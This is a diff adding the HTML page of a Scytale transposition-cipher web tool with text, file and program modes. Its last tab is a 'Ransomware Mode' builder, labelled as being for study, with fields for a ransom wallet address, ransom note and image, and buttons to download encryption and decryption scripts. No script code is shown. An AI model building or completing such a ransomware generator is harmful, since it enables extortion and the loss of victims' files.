@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Scytale Cipher</title>
+    <link rel="stylesheet" href="styles.css">
+    
+
+</head>
+<body>
+    <div class="container">
+        <h1>Scytale Cipher</h1>
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="text">Text Mode</button>
+            <button class="tab-btn" data-tab="file">File Mode</button>
+            <button class="tab-btn" data-tab="program">Program Mode</button>
+            <button class="tab-btn" data-tab="ransomware">Ransomware Mode</button>
+        </div>
+
+        <div class="tab-content active" id="text-mode">
+            <div class="input-group">
+                <label for="columns">Number of Columns:</label>
+                <input type="number" id="columns" min="2" value="4">
+            </div>
+
+            <div class="input-group">
+                <label for="input-text">Input Text:</label>
+                <textarea id="input-text" placeholder="Enter your text here..."></textarea>
+            </div>
+
+            <div class="button-group">
+                <button id="encrypt-btn">Encrypt</button>
+                <button id="decrypt-btn">Decrypt</button>
+            </div>
+
+            <div class="visualization-container">
+                <h3>Visualization</h3>
+                <div id="scytale-table" class="scytale-table"></div>
+            </div>
+
+            <div class="output-group">
+                <label for="output-text">Result:</label>
+                <textarea id="output-text" readonly></textarea>
+            </div>
+        </div>
+
+        <div class="tab-content" id="file-mode">
+            <div class="input-group">
+                <label for="file-columns">Number of Columns:</label>
+                <input type="number" id="file-columns" min="2" value="4">
+            </div>
+
+            <div class="drop-zone">
+                <div class="drop-zone-prompt">
+                    <span>Drop file here or click to upload</span>
+                    <input type="file" id="file-input" class="drop-zone-input">
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button id="encrypt-file-btn">Encrypt File</button>
+                <button id="decrypt-file-btn">Decrypt File</button>
+                <button id="download-btn" disabled>Download Result</button>
+            </div>
+
+            <div class="file-info">
+                <p id="file-status"></p>
+                <p id="file-details"></p>
+            </div>
+        </div>
+
+        <div class="tab-content" id="program-mode">
+            
+                <div class="input-group">
+                    <label for="program-columns">Number of Columns: </label>
+                    <input type="number" id="program-columns" min="2" value="4">
+                </div>
+                <div class="button-group program-buttons">
+                    <button id="download-encryption-program-btn">download Encryption Program</button>
+                    <button id="download-decryption-program-btn">download Decryption Program</button>
+                </div>
+        </div>
+        <div class="tab-content" id="ransomware-mode">
+            <h2>Ransomware Mode</h2>
+            <h3>Crypto locker ransomware maker to help and study how help enfected</h3>
+            <div class="input-group">
+                <label for="num-columns">Number of Columns:</label>
+                <input type="number" id="num-columns" class="styled-input" placeholder="Enter number of columns..." min="1" value="4">
+            </div>
+        
+            <div class="input-group">
+                <label for="wallet-address">Wallet Address:</label>
+                <input type="text" id="wallet-address" class="styled-input" placeholder="Enter your wallet address here...">
+            </div>
+        
+            <div class="input-group">
+                <label for="ransom-note">Ransom Note Text:</label>
+                <textarea id="ransom-note" class="styled-textarea" placeholder="Enter the ransom note text here..."></textarea>
+            </div>
+            <div class="input-group">
+            <label for="image-url-input">Image URL:</label>
+            <input type="text" id="image-url-input" required>
+            </div>
+            <div class="button-group">
+                <button id="download-encryption-btn">Download Encryption Script</button>
+                <button id="download-decryption-btn">Download Decryption Script</button>
+            </div>
+        
+            <p id="ransomware-status" style="text-align: center; color: var(--primary-color);"></p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
